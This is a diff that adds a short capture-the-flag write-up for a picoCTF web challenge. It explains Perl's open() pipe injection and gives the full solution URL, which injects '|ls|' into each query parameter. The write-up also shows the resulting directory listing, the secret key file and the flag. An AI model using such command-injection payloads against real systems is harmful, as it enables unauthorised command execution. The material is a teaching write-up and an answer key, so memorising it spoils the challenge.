@@ -1,0 +1,40 @@
+One thing that must be understood is the usage of piping in perl:
+http://www.cgisecurity.com/lib/sips.html
+
+This is a web exploit when opening a file. If you do not specify whether the file is opened an input or output, there is an option to put a '|' after the filename and run any command in the shell and have it piped to the user.
+
+However, this problem requires you to run the pipe on all the parameters (each one opening a different file in the directory, but still running ls on the same directory).
+The reason is that the print does a bitwise and of all the results from each file, so if the text in the files don't match up, nothing gets printed. So, all of them have to print the same thing for the bitwise and to give you something.
+
+
+Solution is achieved by visiting this link:
+http://makeaface.picoctf.com/index.cgi?Head=1.bmp|ls|&Hair=0.bmp|ls|&Nose=3.bmp|ls|&Mouth=1.bmp|ls|&Eyes=1.bmp|ls|
+
+This is printed which is a listing of all the files:
+SECRET_KEY_2b609783951a8665d8c67d721b52b0f8
+css.css
+eyes1.bmp
+eyes2.bmp
+eyes3.bmp
+eyes4.bmp
+hair0.bmp
+hair1.bmp
+hair2.bmp
+head1.bmp
+head2.bmp
+head3.bmp
+head4.bmp
+index.cgi
+js.js
+mouth1.bmp
+mouth2.bmp
+mouth3.bmp
+nose1.bmp
+nose2.bmp
+nose3.bmp
+
+Then you retrieve the key from:
+http://makeaface.picoctf.com/SECRET_KEY_2b609783951a8665d8c67d721b52b0f8 
+
+why_did_we_stop_using_perl_again?
+^ NOTE: Thank god.
